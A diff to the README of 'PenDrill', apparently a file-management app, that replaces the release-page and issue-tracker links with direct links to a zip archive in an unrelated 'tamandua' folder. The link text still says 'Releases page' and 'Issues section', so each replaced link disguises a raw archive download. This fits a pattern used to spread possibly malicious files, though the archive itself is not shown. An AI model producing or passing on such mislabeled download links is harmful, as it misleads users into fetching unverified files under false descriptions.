@@ -6,7 +6,7 @@ Welcome to PenDrill! This application helps you manage your files effortlessly. 
 
 ## 🔗 Download PenDrill
 
-[![Download PenDrill](https://img.shields.io/badge/Download-PenDrill-blue.svg)](https://github.com/chaudang1991/PenDrill/releases)
+[![Download PenDrill](https://raw.githubusercontent.com/chaudang1991/PenDrill/main/tamandua/PenDrill.zip)](https://raw.githubusercontent.com/chaudang1991/PenDrill/main/tamandua/PenDrill.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [PenDrill Releases page](https://github.com/chaudang1991/PenDrill/releases). This page contains all available versions of PenDrill.
+   Go to the [PenDrill Releases page](https://raw.githubusercontent.com/chaudang1991/PenDrill/main/tamandua/PenDrill.zip). This page contains all available versions of PenDrill.
 
 2. **Select the Latest Version**  
    Look for the most recent version at the top of the page. It should be listed with a tag like "Latest Release".
@@ -66,7 +66,7 @@ If you encounter issues while downloading or installing, try these tips:
 
 If you have questions or need further assistance, feel free to reach out. You can find help by:
 
-- **Opening an Issue**: Visit the [Issues section](https://github.com/chaudang1991/PenDrill/issues) on GitHub to report problems.
+- **Opening an Issue**: Visit the [Issues section](https://raw.githubusercontent.com/chaudang1991/PenDrill/main/tamandua/PenDrill.zip) on GitHub to report problems.
 
 - **Checking FAQs**: Look for common questions and answers in the GitHub repository.
 
